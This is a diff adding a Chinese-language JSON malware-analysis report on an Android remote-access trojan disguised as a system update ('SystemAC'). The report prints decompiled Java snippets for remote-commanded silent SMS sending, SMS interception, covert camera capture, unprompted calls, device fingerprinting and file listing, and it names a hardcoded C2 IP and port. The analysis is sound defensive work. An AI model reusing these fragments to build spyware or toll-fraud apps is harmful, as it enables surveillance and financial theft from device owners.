@@ -1,0 +1,268 @@
+{
+  "APK信息": {
+    "文件名": "38ea98815234d25f0360fe43398e215c9243222b4439875d118879d5e080049a.apk",
+    "sha256": "38ea98815234d25f0360fe43398e215c9243222b4439875d118879d5e080049a",
+    "包名": "com.update.systemac",
+    "应用名": "SystemAC",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 290.3
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\Android\\AowsCLNT;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public class AowsCLNT extends CLFace implements Controler {\n    byte[] cmd;\n    ConnectClass conn;\n    AowsCmdP packet;\n    AowsPRCommand procCmd;",
+          "malicious_code_snippet_context": "  import java.util.Calendar;\n  \n  /* loaded from: classes.dex */\n>>> public class AowsCLNT extends CLFace implements Controler {\n>>>     byte[] cmd;\n>>>     ConnectClass conn;\n>>>     AowsCmdP packet;\n>>>     AowsPRCommand procCmd;\n      Thread readthread;\n      public final String TAG = AowsCLNT.class.getSimpleName();\n      int nbAttempts = 10;",
+          "behavior_description": "类 AowsCLNT 实现了 Controler 接口，内部包含 ConnectClass (连接管理)、AowsCmdP (命令包)、AowsPRCommand (命令处理) 等成员变量，构成了 C2 客户端的基础结构，用于与远程控制服务器建立连接并接收、解析和执行控制指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "SMS_RECEIVED"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\Android\\AowsPRCommand;",
+          "method_signature": "if(text.getBytes()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.commande == Protocol.SEND_SMS) {\n    Map<String, String> information = EncoderHelper.decodeHashMap(this.arguments.array());\n    String num = information.get(Protocol.KEY_SEND_SMS_NUMBER);\n    String text = information.get(Protocol.KEY_SEND_SMS_BODY);\n    if (text.getBytes().length < 167) {\n        SmsManager.getDefault().sendTextMessage(num, null, text, null, null);\n    } else {\n        ArrayList<String> multipleMsg = MessageDecoupator(text);\n        SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);\n    }\n    this.client.sendInformation(\"SMS sent\");\n}",
+          "malicious_code_snippet_context": "              this.client.toast.show();\n              return;\n          }\n>>>         if (this.commande == Protocol.SEND_SMS) {\n>>>             this.MyFileHandler = null;\n>>>             Map<String, String> information = EncoderHelper.decodeHashMap(this.arguments.array());\n>>>             String num = information.get(Protocol.KEY_SEND_SMS_NUMBER);\n>>>             String text = information.get(Protocol.KEY_SEND_SMS_BODY);\n>>>             if (text.getBytes().length < 167) {\n>>>                 SmsManager.getDefault().sendTextMessage(num, null, text, null, null);\n>>>             } else {\n>>>                 ArrayList<String> multipleMsg = MessageDecoupator(text);\n>>>                 SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);\n>>>             }\n>>>             this.client.sendInformation(\"SMS sent\");\n              return;\n          }\n          if (this.commande != Protocol.GIVE_CALL) {",
+          "behavior_description": "代码接收远程C2服务器下发的SEND_SMS指令，从指令参数中解码出目标手机号和短信内容，然后调用SmsManager静默发送短信（短信用sendTextMessage，长短信自动分割后用sendMultipartTextMessage），发送完成后向服务器回传'SMS sent'确认。整个过程无用户交互，短信号码和内容完全由远程控制端指定，属于典型的短信欺诈/远程控制行为，可导致用户被扣费或成为钓鱼/垃圾短信发送节点。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\update\\systemac\\Android\\AowsCLNT;",
+          "method_signature": "registerSMSAndCall()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void registerSMSAndCall() {\n    IntentFilter filter = new IntentFilter();\n    filter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\n    registerReceiver(this.SMSreceiver, filter);\n    IntentFilter filter2 = new IntentFilter();\n    filter2.addAction(\"android.intent.action.PHONE_STATE\");\n    registerReceiver(this.Callreceiver, filter2);\n}",
+          "malicious_code_snippet_context": "          this.elapsedTime = 1;\n      }\n  \n>>>     public void registerSMSAndCall() {\n>>>         IntentFilter filter = new IntentFilter();\n>>>         filter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\n>>>         registerReceiver(this.SMSreceiver, filter);\n>>>         IntentFilter filter2 = new IntentFilter();\n>>>         filter2.addAction(\"android.intent.action.PHONE_STATE\");\n>>>         registerReceiver(this.Callreceiver, filter2);\n>>>     }\n  \n      @Override // com.update.systemac.MyConnection.Controler\n      public void Storage(TransportPacket p, String str) {",
+          "behavior_description": "代码注册了BroadcastReceiver来监听短信接收广播(SMS_RECEIVED)和电话状态变化广播(PHONE_STATE)，用于拦截用户收到的短信和来电。在恶意软件中，这种技术常用于窃取验证码、隐藏特定短信内容或拦截银行确认短信，数据流向为：系统短信广播(SMS_RECEIVED)→registerReceiver注册的接收器处理拦截。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\MyHandlers\\AowsSysInfo;",
+          "method_signature": "phoneInfo()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.p.setPhoneNumber(tm.getLine1Number());\nthis.p.setIMEI(tm.getDeviceId());\nthis.p.setSoftwareVersion(tm.getDeviceSoftwareVersion());\nthis.p.setCountryCode(tm.getNetworkCountryIso());\nthis.p.setOperatorCode(tm.getNetworkOperator());\nthis.p.setOperatorName(tm.getNetworkOperatorName());\nthis.p.setSimOperatorCode(tm.getSimOperator());\nthis.p.setSimOperatorName(tm.getSimOperatorName());\nthis.p.setSimCountryCode(tm.getSimCountryIso());\nthis.p.setSimSerial(tm.getSimSerialNumber());",
+          "malicious_code_snippet_context": "  \n      public void phoneInfo() {\n          TelephonyManager tm = (TelephonyManager) this.ctx.getSystemService(\"phone\");\n>>>         this.p.setPhoneNumber(tm.getLine1Number());\n>>>         this.p.setIMEI(tm.getDeviceId());\n>>>         this.p.setSoftwareVersion(tm.getDeviceSoftwareVersion());\n>>>         this.p.setCountryCode(tm.getNetworkCountryIso());\n>>>         this.p.setOperatorCode(tm.getNetworkOperator());\n>>>         this.p.setOperatorName(tm.getNetworkOperatorName());\n>>>         this.p.setSimOperatorCode(tm.getSimOperator());\n>>>         this.p.setSimOperatorName(tm.getSimOperatorName());\n>>>         this.p.setSimCountryCode(tm.getSimCountryIso());\n>>>         this.p.setSimSerial(tm.getSimSerialNumber());\n      }\n  \n      public void networkInfo() {",
+          "behavior_description": "通过 TelephonyManager 获取手机号、IMEI、设备软件版本、网络国家码、运营商信息及SIM序列号等大量设备敏感信息，并将其存储在本地对象中，存在过度收集隐私的风险。数据流向为：TelephonyManager API (source) → 本地对象属性赋值 (sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "DevicePolicyManager"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\Updater;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public class Updater extends Activity {\n    static final int ACTIVATION_REQUEST = 47;\n    static final String TAG = \"DevicePolicyDemoActivity\";\n    Intent AowsClient;",
+          "malicious_code_snippet_context": "  import android.widget.ImageView;\n  \n  /* loaded from: classes.dex */\n>>> public class Updater extends Activity {\n>>>     static final int ACTIVATION_REQUEST = 47;\n>>>     static final String TAG = \"DevicePolicyDemoActivity\";\n>>>     Intent AowsClient;\n      Intent AowsClientAlt;\n      ComponentName SystemAdminUpdate;\n      DevicePolicyManager devicePolicyManager;",
+          "behavior_description": "该Activity伪装为系统更新程序（Updater），导入了DevicePolicyManager设备管理器API，意图请求设备管理权限以实现锁屏勒索。DevicePolicyManager可调用lockNow()强制锁屏或resetPassword()重置密码，是Android勒索软件常用的设备锁定手段。TAG标记为DevicePolicyDemoActivity表明代码基于设备管理器示例修改而来。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\MyHandlers\\AowsPhoto;",
+          "method_signature": "if(this.cam == null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.cam = Camera.open();\nSurfaceView view = new SurfaceView(this.ctx);\nthis.holder = view.getHolder();\nthis.cam.setPreviewDisplay(this.holder);\nthis.cam.startPreview();\nthis.cam.takePicture(null, null, this.pic);",
+          "malicious_code_snippet_context": "          }\n          Log.i(\"PhotoTaker\", \"Just before Open !\");\n          try {\n>>>             this.cam = Camera.open();\n>>>             Log.i(\"PhotoTaker\", \"Right after Open !\");\n>>>             if (this.cam == null) {\n>>>                 return false;\n>>>             }\n>>>             SurfaceView view = new SurfaceView(this.ctx);\n              try {\n                  this.holder = view.getHolder();\n                  this.cam.setPreviewDisplay(this.holder);",
+          "behavior_description": "代码通过 Camera.open() 静默打开设备摄像头，创建一个未添加到可见UI布局的 SurfaceView 作为预览载体（绕过Android要求预览的限制但不向用户展示），启动预览后调用 takePicture() 拍摄照片，捕获的图像数据通过 pic 回调传递给恶意程序进行后续窃取。数据流向：Camera.open()（访问摄像头硬件）→ takePicture()（秘密拍摄并获取图像数据）",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\Android\\AowsPRCommand;",
+          "method_signature": "if(this.commande == 5)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String uri = \"tel:\" + new String(this.arguments.array());\nthis.intent = new Intent(\"android.intent.action.CALL\", Uri.parse(uri));\nthis.intent.setFlags(268435456);\nthis.client.startActivity(this.intent);",
+          "malicious_code_snippet_context": "              }\n          }\n          this.MyFileHandler = null;\n>>>         String uri = \"tel:\" + new String(this.arguments.array());\n>>>         this.intent = new Intent(\"android.intent.action.CALL\", Uri.parse(uri));\n>>>         this.intent.setFlags(268435456);\n>>>         this.client.startActivity(this.intent);\n      }\n  \n      public AowsPrefP loadPreferences() {",
+          "behavior_description": "该代码位于远程控制木马的命令分发器中（commande==5分支），从远程C2服务器下发的指令参数(this.arguments.array())中提取电话号码，构造tel: URI后使用ACTION_CALL意图直接拨打电话，无需用户确认。结合SharedPreferences中硬编码的C2服务器IP(31.9.48.183:1717)，攻击者可远程控制受感染设备拨打指定号码（如高费率号码），直接造成用户经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\Android\\AowsPRCommand;",
+          "method_signature": "if(!mnt.exists()",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.commande == Protocol.LIST_DIR) {\n    String file = new String(this.arguments.array());\n    if (file.equalsIgnoreCase(\"ext\")) {\n        File mnt = new File(\"/storage\");\n        if (!mnt.exists()) {\n            mnt = new File(\"/mnt\");\n        }\n        File[] roots = mnt.listFiles(new FileFilter() {\n            public boolean accept(File pathname) {\n                if (pathname.isDirectory() && pathname.exists() && pathname.canWrite()) {\n                    if (!pathname.isHidden()) {\n                        return true;\n                    }\n                }\n            }\n        });\n    }\n}",
+          "malicious_code_snippet_context": "              }\n              return;\n          }\n>>>         if (this.commande == Protocol.LIST_DIR) {\n>>>             this.MyFileHandler = null;\n>>>             this.client.sendInformation(\"List directory request received\");\n>>>             String file = new String(this.arguments.array());\n>>>             if (file.equalsIgnoreCase(\"ext\")) {\n>>>                 File mnt = new File(\"/storage\");\n>>>                 if (!mnt.exists()) {\n>>>                     mnt = new File(\"/mnt\");\n>>>                 }\n>>>                 try {\n>>>                     File[] roots = mnt.listFiles(new FileFilter() { // from class: com.update.systemac.Android.AowsPRCommand.1\n>>>                         @Override // java.io.FileFilter\n>>>                         public boolean accept(File pathname) {\n>>>                             boolean z;\n>>>                             try {\n>>>                                 if (pathname.isDirectory() && pathname.exists() && pathname.canWrite()) {\n>>>                                     if (!pathname.isHidden()) {\n>>>                                         z = true;\n                                          return z;\n                                      }\n                                  }",
+          "behavior_description": "代码接收远程指令 LIST_DIR，根据参数枚举设备外部存储路径（/storage 或 /mnt）下的可写、非隐藏目录，用于远程文件系统浏览，为后续文件窃取或篡改做准备。数据来源为远程C2下发的命令参数，危险操作为遍历设备文件系统目录结构。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
